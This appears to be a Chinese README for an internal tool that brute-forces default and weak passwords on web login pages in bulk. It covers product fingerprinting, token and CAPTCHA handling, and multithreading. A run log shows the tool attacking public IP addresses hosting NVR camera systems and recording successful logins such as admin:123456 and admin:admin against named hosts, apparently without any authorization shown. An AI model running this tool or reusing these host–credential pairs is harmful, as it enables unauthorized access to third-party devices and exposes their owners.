# 批量弱密码爆破工具

http://192.168.0.254:8090/pages/viewpage.action?pageId=111414849

实现对文件中的IP:端口执行弱密码探测的基本功能：

- weakpass_call.py 为调用程序
- weakpass_config.py 为配置文件
- weakpass_report.py 为报告文件（未开发，后续实现结果报送到渗透框架的数据库中）

## 调用方式
```python weakpass_call.py target_list.txt```


![image.png](https://192.168.201.36:8443/sec/view/head/branches/weakpass/png/Pasted%20image%2020220402111746.png)


target_list 为 IP:端口 的列表，一行一个目标；
#### 命令行参数
```
-d [Num] 可以开启浏览器显示，查看登录效果是否正常，也是调试开关
-g url 可以打开playwright代码生成工具codegen模块，用于调试配置，如获取下述用户名字段，密码字段和按钮名称等；下面举例

```


#### 已实现
- 实现对的目标列表的自动识别产品，调用**对应的弱口令**字典进行探测
- 支持多线程并行，批量化目标探测
- 支持错误3次后跳转下一个目标，支持基于密码枚举用户
- 支持用户名密码加密传输的情况
- 支持隐藏Token的情况
- 支持简单验证码的情况
- 支持通过相似度自动判断成功失败、异常

#### 未来计划TODO：
- 解决一些网络原因导致加载异常报错
- 增加更多配置
- 对于未识别的，调用默认字典
- 支持hydra爆破其他端口
- 支持go开发，便于内网使用





## 安装

STEP1. 官方网站下载Python3.7+环境。
	- python.org

STEP2. 安装调用库PlayWright，Fire，loguru  
	- pip install playwright  
	- python -m playwright install  
	- pip install Fire  
	- pip install loguru

安装完成后，使用上述命令执行即可；


## 配置
基础配置如下：
![image.png](https://192.168.201.36:8443/sec/view/head/branches/weakpass/png/Pasted%20image%2020220402113226.png)

- keywords：字典类型，识别产品的关键词，各个关键词之间**与**关系，即登录页html中某些关键词，支持base64编码；留空则直接用“中性下一代防火墙”作为关键词判断，如果没有找到则归为未识别

- user_info：是包含username 字段名和字典目录的元组，pass_info类似

- button：按钮名称，字符串类型，一般用weakpass_call.py -g url 获取按钮名称

- CAPTCHA: 长度一般为2，位置0位填充，位置1为截图，如果长度为0，则代表没有验证码

- suc：登录成功后html中内容关键字，支持base64，根据logic计算整体真假

- fail：登录失败后html中内容关键字，支持base64，根据logic计算整体真假


考虑到配置的便捷性，可以使用-g参数激活浏览器自动获取关键字段，便于填写

```
python .\weakpass_call.py test -g http://219.233.221.163/
```

![image.png](https://192.168.201.36:8443/sec/view/head/branches/weakpass/png/Pasted%20image%2020220402112816.png)

把这些信息复制到配置文件，填写配置

![image.png](https://192.168.201.36:8443/sec/view/head/branches/weakpass/png/Pasted%20image%2020220402113558.png)


日志文件相关配置

![image.png](https://192.168.201.36:8443/sec/view/head/branches/weakpass/png/Pasted%20image%2020220402113635.png)

分别为错误记录、未识别设备、登录成功、登录失败、登录异常



## 参考链接

常见产品弱口令（默认口令）：[https://baizesec.github.io/bylibrary/%E9%80%9F%E6%9F%A5%E8%A1%A8/%E5%B8%B8%E8%A7%81%E4%BA%A7%E5%93%81%E5%BC%B1%E5%8F%A3%E4%BB%A4/](https://baizesec.github.io/bylibrary/%E9%80%9F%E6%9F%A5%E8%A1%A8/%E5%B8%B8%E8%A7%81%E4%BA%A7%E5%93%81%E5%BC%B1%E5%8F%A3%E4%BB%A4/)

我司战略产品弱口令：[密码表](http://192.168.13.254:8090/pages/viewpage.action?pageId=109019660)


## 更新
2022-10-21:
	已实现协程调用
	```
	D:\04-Python\2022-09-21___Web弱密码扫描>python webpass_call.py -f target1.txt
	2022-10-21 16:56:14.660 | INFO     | __main__:main:319 - _Fire(466) --> _CallAndUpdateTrace(681) --> launch(371) --> main(319) --> | 目标总数 => 8
	2022-10-21 16:56:22.453 | SUCCESS  | __main__:deal_product_result:85 - 已识别: http://80.52.143.218:1025 -> 宇视NVR地址: BCS-P-NVR3202
	2022-10-21 16:56:22.514 | SUCCESS  | __main__:deal_product_result:85 - 已识别: http://91.235.247.118:88 -> 宇视NVR地址: NVR8-2
	2022-10-21 16:56:24.704 | INFO     | __main__:create_task_list:133 - 创建任务: 已添加字典3条, 当前总任务数3个. http://80.52.143.218:1025:宇视NVR地址
	2022-10-21 16:56:24.706 | INFO     | __main__:create_task_list:133 - 创建任务: 已添加字典3条, 当前总任务数6个. http://91.235.247.118:88:宇视NVR地址
	2022-10-21 16:56:33.169 | SUCCESS  | __main__:deal_product_result:85 - 已识别: http://109.95.32.165:85 -> 宇视NVR地址: ZIP-NVR201-08L
	2022-10-21 16:56:34.733 | INFO     | __main__:create_task_list:133 - 创建任务: 已添加字典3条, 当前总任务数3个. http://109.95.32.165:85:宇视NVR地址
	2022-10-21 16:56:34.855 | SUCCESS  | __main__:deal_product_result:85 - 已识别: http://213.231.6.93:85 -> 宇视NVR地址: ZIP-NVR302-16S
	2022-10-21 16:56:39.280 | ERROR    | __main__:deal_product_result:95 - 连接超时: http://151.20.32.39:58585
	2022-10-21 16:56:39.353 | ERROR    | __main__:deal_product_result:95 - 连接超时: http://171.6.135.220:88
	2022-10-21 16:56:39.361 | INFO     | __main__:login_fail:204 - http://91.235.247.118:88 -> admin : 888888 登录失败: 0.9732
	2022-10-21 16:56:39.423 | ERROR    | __main__:deal_product_result:95 - 连接超时: http://91.222.154.123:58603
	2022-10-21 16:56:39.761 | INFO     | __main__:create_task_list:133 - 创建任务: 已添加字典3条, 当前总任务数3个. http://213.231.6.93:85:宇视NVR地址
	2022-10-21 16:56:44.305 | SUCCESS  | __main__:login_success:199 - http://80.52.143.218:1025 -> admin : 123456 登录成功: 0.4649
	2022-10-21 16:56:51.164 | INFO     | __main__:login_fail:204 - http://109.95.32.165:85 -> admin : 888888 登录失败: 0.8743
	2022-10-21 16:56:58.144 | INFO     | __main__:login_fail:204 - http://213.231.6.93:85 -> admin : 888888 登录失败: 0.8744
	2022-10-21 16:57:03.536 | SUCCESS  | __main__:login_success:199 - http://80.52.143.218:1025 -> admin : admin 登录成功: 0.4413
	2022-10-21 16:57:10.671 | INFO     | __main__:login_fail:204 - http://109.95.32.165:85 -> admin : admin 登录失败: 0.8743
	2022-10-21 16:57:15.155 | INFO     | __main__:login_fail:204 - http://91.235.247.118:88 -> admin : 123456 登录失败: 0.9732
	2022-10-21 16:57:18.108 | ERROR    | __main__:deal_product_result:95 - 连接超时: http://31.169.84.106:81

	==================================================
	目标可识别: 4/8, 50.00%, 未识别地址：4
	剩余任务数: 0, 任务总数: 12
	成功数量: 2
	失败或异常数量: 5
	==================================================
	2022-10-21 16:57:20.383 | INFO     | __main__:login_fail:204 - http://80.52.143.218:1025 -> admin : 888888 登录失败: 0.6169
	2022-10-21 16:57:24.803 | INFO     | __main__:login_fail:204 - http://91.235.247.118:88 -> admin : admin 登录失败: 0.9732
	2022-10-21 16:57:32.112 | SUCCESS  | __main__:login_success:199 - http://109.95.32.165:85 -> admin : 123456 登录成功: 0.4594
	2022-10-21 16:57:38.999 | INFO     | __main__:login_fail:204 - http://213.231.6.93:85 -> admin : admin 登录失败: 0.8744
	2022-10-21 16:57:46.044 | SUCCESS  | __main__:login_success:199 - http://213.231.6.93:85 -> admin : 123456 登录成功: 0.4649
	```